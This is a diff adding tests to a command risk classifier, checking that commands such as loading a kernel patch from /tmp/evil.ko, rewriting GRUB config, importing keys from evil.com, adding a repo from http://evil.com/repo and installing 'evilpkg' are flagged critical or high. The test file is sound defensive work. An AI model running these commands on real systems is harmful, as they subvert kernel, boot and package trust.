@@ -3446,4 +3446,85 @@ describe('classifyCommand v1.10.157+ recent additions', () => {
         `${cmd}: expected cron-spool-write`);
     }
   });
+
+  // (v1.10.182) Backfill tests for v1.10.177-181 rules.
+  it('kernel-module-load extension to kpatch (v1.10.177)', () => {
+    for (const cmd of [
+      'kpatch load /tmp/evil.ko',
+      'kpatch enable evil',
+      'kpatch-build -o evil.ko evil.patch',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'critical', `${cmd} should be critical`);
+      assert.ok(r.reasons.some((x) => x.code === 'kernel-module-load'),
+        `${cmd}: expected kernel-module-load`);
+    }
+    // info forms stay low
+    assert.strictEqual(classifyCommand('kpatch list').level, 'low');
+  });
+
+  it('boot-config-write extension to /etc/default/grub + update-grub (v1.10.178)', () => {
+    for (const cmd of [
+      'echo evil > /etc/default/grub',
+      'update-grub',
+      'sudo update-grub',
+      'grub-mkconfig -o /boot/grub/grub.cfg',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'critical', `${cmd} should be critical`);
+      assert.ok(r.reasons.some((x) => x.code === 'boot-config-write'),
+        `${cmd}: expected boot-config-write`);
+    }
+    // info / read stays low
+    assert.strictEqual(classifyCommand('grub-mkconfig --help').level, 'low');
+    assert.strictEqual(classifyCommand('cat /etc/default/grub').level, 'low');
+  });
+
+  it('apt-key-trust (v1.10.179) + rpm/dnf extension (v1.10.180)', () => {
+    for (const cmd of [
+      'apt-key add /tmp/evil.gpg',
+      'apt-key adv --keyserver evil.com --recv-keys X',
+      'echo evil > /usr/share/keyrings/evil.gpg',
+      'cp /tmp/evil.gpg /etc/apt/trusted.gpg.d/',
+      'rpm --import /tmp/evil.gpg',
+      'rpmkeys --import /tmp/evil.gpg',
+      'dnf config-manager --add-repo http://evil.com/repo',
+      'echo evil > /etc/yum.repos.d/evil.repo',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'critical', `${cmd} should be critical`);
+      assert.ok(r.reasons.some((x) => x.code === 'apt-key-trust'),
+        `${cmd}: expected apt-key-trust`);
+    }
+    // reads / queries stay low
+    for (const cmd of [
+      'apt-key list',
+      'rpm --query gpg-pubkey',
+      'cat /etc/yum.repos.d/CentOS-Base.repo',
+      'dnf list available',
+    ]) {
+      assert.ok(!classifyCommand(cmd).reasons.some((x) => x.code === 'apt-key-trust'),
+        `${cmd}: should not match`);
+    }
+  });
+
+  it('lang-pkg-global-install extension to pipx/poetry/uv/brew tap (v1.10.181)', () => {
+    for (const cmd of [
+      'pipx install evilpkg',
+      'poetry add evil-pkg',
+      'uv pip install evilpkg',
+      'uv tool install evilpkg',
+      'brew install evil/tap/pkg',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'lang-pkg-global-install'),
+        `${cmd}: expected lang-pkg-global-install`);
+    }
+    // info forms / official tap stays low
+    for (const cmd of ['pipx --help', 'pipx list', 'poetry --version', 'poetry build']) {
+      assert.ok(!classifyCommand(cmd).reasons.some((x) => x.code === 'lang-pkg-global-install'),
+        `${cmd}: should not match`);
+    }
+  });
 });
